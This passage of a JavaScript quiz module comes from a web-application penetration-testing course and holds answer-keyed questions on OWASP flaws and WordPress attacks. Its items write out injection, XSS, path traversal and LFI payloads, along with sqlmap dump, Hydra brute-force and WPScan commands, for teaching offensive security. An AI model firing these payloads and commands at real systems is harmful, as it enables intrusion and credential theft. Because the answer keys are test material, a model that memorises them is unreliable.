      'Reflected XSS uses SQL, Stored XSS uses JavaScript'
    ],
    correct: 1,
    explanation: 'Reflected XSS payloads are in the URL/request and only execute when a victim clicks the crafted link. Stored XSS payloads are saved in the database and execute for every user who views that page, making it more dangerous.'
  },
  {
    type: 'drag-match',
    question: 'Match each vulnerability to the correct payload:',
    pairs: [
      { label: 'SQL Injection', value: "' OR 1=1-- -" },
      { label: 'XSS', value: '<script>alert(1)</script>' },
      { label: 'Command Injection', value: '; cat /etc/passwd' },
      { label: 'Directory Traversal', value: '../../../etc/passwd' },
      { label: 'IDOR', value: '/api/user/124 (changing ID)' },
    ]
  },
  {
    type: 'mcq',
    question: 'Which OWASP Top 10 category moved to the #1 position in 2021?',
    options: [
      'Injection',
      'Broken Access Control',
      'Cryptographic Failures',
      'Security Misconfiguration'
    ],
    correct: 1,
    explanation: 'Broken Access Control (A01) took the #1 spot in OWASP 2021, moving up from #5 in 2017. This includes IDOR, privilege escalation, and unauthorized access — reflecting how common these flaws are in real applications.'
  },
  {
    type: 'type-command',
    question: 'You have a database called "webapp" with a table called "users". Use sqlmap to dump all data from the users table.',
    scenario: 'The target URL is http://target/page?id=1. Extract the users table data.',
    validAnswers: [
      'sqlmap -u "http://target/page?id=1" -D webapp -T users --dump',
      'sqlmap -u "http://target/page?id=1" -D webapp -T users --dump --batch',
    ],
    hint: 'sqlmap -u "[url]" -D [database] -T [table] --dump',
    explanation: 'The -D flag specifies the database, -T specifies the table, and --dump extracts all rows from that table.'
  },
  {
    type: 'mcq',
    question: 'An attacker uses php://filter/convert.base64-encode/resource=config.php as the value for a file parameter. What are they exploiting?',
    options: [
      'SQL Injection',
      'Remote File Inclusion (RFI)',
      'Local File Inclusion (LFI) with PHP wrapper',
      'Server-Side Request Forgery (SSRF)'
    ],
    correct: 2,
    explanation: 'The php://filter wrapper is used in LFI attacks to read PHP source code as base64, preventing it from being executed. This allows the attacker to read sensitive files like config.php which may contain database credentials.'
  },
  {
    type: 'mcq',
    question: 'You are testing a web application that has a "ping" feature. Which payload would confirm command injection?',
    options: [
      "' OR 1=1-- -",
      '<script>alert(1)</script>',
      '; whoami',
      '../../../etc/passwd'
    ],
    correct: 2,
    explanation: 'The semicolon (;) terminates the ping command, and whoami runs as a separate OS command. If the output shows a username, command injection is confirmed. The other payloads test for SQLi, XSS, and path traversal respectively.'
  },
  {
    type: 'type-command',
    question: 'Use Hydra to brute force a web login at http://target/login. The username is "admin", the password wordlist is /usr/share/wordlists/rockyou.txt, the POST parameters are "user" and "pass", and the failure message is "Invalid".',
    scenario: 'Brute force an HTTP POST form login page.',
    validAnswers: [
      'hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
    ],
    hint: 'hydra -l [user] -P [wordlist] [target] http-post-form "/path:params:failure_string"',
    explanation: 'Hydra uses -l for a single username, -P for a password list. http-post-form takes three colon-separated values: the path, the POST data with ^USER^/^PASS^ placeholders, and a string that appears on failed login.'
  },
  {
    type: 'mcq',
    question: 'What makes xmlrpc.php on WordPress a valuable brute force target?',
    options: [
      'It has no authentication',
      'It supports system.multicall, allowing hundreds of password attempts in a single request',
      'It always uses default credentials',
      'It bypasses the WordPress firewall'
    ],
    correct: 1,
    explanation: 'xmlrpc.php supports system.multicall which lets you bundle hundreds of authentication attempts into one HTTP request. This bypasses most login rate-limiters that count by request, not by attempt.'
  },
  {
    type: 'drag-match',
    question: 'Match each WordPress path to its purpose:',
    pairs: [
      { label: '/wp-admin/', value: 'Admin dashboard' },
      { label: '/wp-login.php', value: 'Login page' },
      { label: '/xmlrpc.php', value: 'XML-RPC API (brute force)' },
      { label: '/wp-config.php', value: 'Database credentials' },
      { label: '/wp-content/uploads/', value: 'Uploaded files' },
    ]
  },
  {
    type: 'mcq',
    question: 'An attacker uploads a file named "shell.php.jpg" to bypass upload filters. What technique is this?',
    options: [
      'Null byte injection',
      'Magic byte manipulation',
      'Double extension bypass',
      'Content-Type spoofing'
    ],
    correct: 2,
    explanation: 'Double extension bypass uses a filename like shell.php.jpg. Some servers check only the last extension (.jpg) for validation but execute based on the first recognized extension (.php). This tricks the filter into accepting a PHP file.'
  },
  {
    type: 'mcq',
    question: 'What is the primary defense against CSRF attacks?',
    options: [
      'Input validation',
      'Output encoding',
      'CSRF tokens (unique per-session random values)',
      'HTTPS encryption'
    ],
    correct: 2,
    explanation: 'CSRF tokens are random, unpredictable values tied to the user session and included in forms. Since the attacker cannot read or predict the token, they cannot craft a valid forged request. This is the primary defense against CSRF.'
  },
  {
    type: 'type-command',
    question: 'Use WPScan to enumerate users, plugins, and themes on a WordPress site at http://target.',
    scenario: 'Perform comprehensive WordPress enumeration.',
    validAnswers: [
      'wpscan --url http://target --enumerate u,p,t',
      'wpscan --url http://target -e u,p,t',
    ],
    hint: 'wpscan --url [target] --enumerate u,p,t',
    explanation: 'WPScan --enumerate u,p,t scans for users (u), plugins (p), and themes (t). This reveals the attack surface: valid usernames for brute forcing and potentially vulnerable plugins/themes.'
  },
  {
    type: 'mcq',
    question: 'You can read /etc/passwd via LFI but want to escalate to Remote Code Execution. Which technique involves injecting PHP into the web server access log and then including it?',
    options: [
      'SQL Injection escalation',
      'Log poisoning',
      'Remote File Inclusion',
      'Cross-Site Scripting'
    ],
    correct: 1,
    explanation: 'Log poisoning involves injecting PHP code into a log file (e.g., via a crafted User-Agent header in an HTTP request). When the poisoned log file is included via LFI, the PHP code executes, giving you RCE. This is one of the most reliable LFI-to-RCE techniques.'
  },
];

// ==================== INTERACTIVES ====================
export function bindInteractives() {
  // No custom interactives for this module — quiz handles engagement.
}
